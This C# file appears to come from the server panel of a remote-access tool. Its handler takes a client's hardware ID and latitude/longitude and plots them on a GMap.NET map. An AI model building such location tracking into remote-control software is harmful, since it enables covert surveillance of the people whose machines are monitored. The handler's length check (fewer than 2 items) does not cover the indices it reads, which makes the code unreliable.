using System.Windows.Forms;
using GMap.NET;
using GMap.NET.WindowsForms;
using GMap.NET.WindowsForms.Markers;
using Server.Connectings;
using Server.Forms;

namespace Server.Messages;

internal class HandlerMap
{
	public static void Read(Clients client, object[] objects)
	{
		if (client == null || objects == null || objects.Length < 2)
		{
			if (client != null)
			{
				client.Disconnect();
			}
			return;
		}
		FormMap form = (FormMap)Application.OpenForms["Map:" + (string)objects[1]];
		if (form == null)
		{
			client.Disconnect();
			return;
		}
		client.Tag = form;
		client.Hwid = (string)objects[1];
		PointLatLng point = new PointLatLng((double)objects[2], (double)objects[3]);
		GMapMarker gmapMarker = new GMarkerGoogle(point, GMarkerGoogleType.green_small);
		gmapMarker.Position = point;
		GMapOverlay markers = new GMapOverlay("MyHome");
		markers.Markers.Add(gmapMarker);
		form.Invoke((MethodInvoker)delegate
		{
			form.Text = "Map [" + (string)objects[1] + "] [lat: " + (double)objects[2] + " lng: " + (double)objects[3] + "]";
			form.client = client;
			form.gMapControl1.Enabled = true;
			form.gMapControl1.Overlays.Add(markers);
			form.gMapControl1.Position = point;
			form.gMapControl1.ShowCenter = false;
		});
	}
}
